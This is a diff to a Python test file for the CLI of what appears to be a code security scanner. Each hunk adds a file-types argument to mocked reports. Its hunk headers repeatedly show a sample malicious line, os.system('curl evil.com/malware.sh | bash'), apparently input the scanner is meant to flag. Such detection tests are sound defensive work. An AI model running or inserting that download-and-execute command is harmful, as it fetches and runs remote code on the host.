@@ -51,6 +51,7 @@ class TestBasicCLI:
                     input=str(test_file),
                     start="2024-01-01T12:00:00",
                     duration=0.5,
+                    all_file_types=[".py"],
                 )
                 mock_process.return_value = mock_report
 
@@ -114,6 +115,7 @@ os.system('curl evil.com/malware.sh | bash')
                     input=str(test_file),
                     start="2024-01-01T12:00:00",
                     duration=0.8,
+                    all_file_types=[".py"],
                 )
                 mock_process.return_value = mock_report
 
@@ -161,6 +163,7 @@ os.system('curl evil.com/malware.sh | bash')
                         input=str(test_file),
                         start="2024-01-01T12:00:00",
                         duration=0.3,
+                        all_file_types=[".py"],
                     )
 
                     # Mock the specific format method
@@ -225,6 +228,7 @@ os.system('curl evil.com/malware.sh | bash')
                     input=str(test_file),
                     start="2024-01-01T12:00:00",
                     duration=0.4,
+                    all_file_types=[".py"],
                 )
                 mock_report.to_report_json = lambda: '{"test": "saved"}'
                 mock_process.return_value = mock_report
@@ -298,6 +302,7 @@ os.system('curl evil.com/malware.sh | bash')
                     input=str(tmp_path),
                     start="2024-01-01T12:00:00",
                     duration=1.2,
+                    all_file_types=[".py", ".txt"],
                 )
                 mock_process.return_value = mock_report
 
@@ -354,6 +359,7 @@ os.system('curl evil.com/malware.sh | bash')
                     input=str(test_file),
                     start="2024-01-01T12:00:00",
                     duration=0.6,
+                    all_file_types=[".py"],
                 )
                 mock_process.return_value = mock_report
 
@@ -404,6 +410,7 @@ os.system('curl evil.com/malware.sh | bash')
                     input=str(tmp_path),
                     start="2024-01-01T12:00:00",
                     duration=0.2,
+                    all_file_types=[".py"],
                 )
                 mock_process.return_value = mock_report
 
@@ -467,6 +474,7 @@ os.system('curl evil.com/malware.sh | bash')
                     input=str(test_file),
                     start="2024-01-01T12:00:00",
                     duration=0.3,
+                    all_file_types=[".py"],
                 )
                 mock_process.return_value = mock_report
 
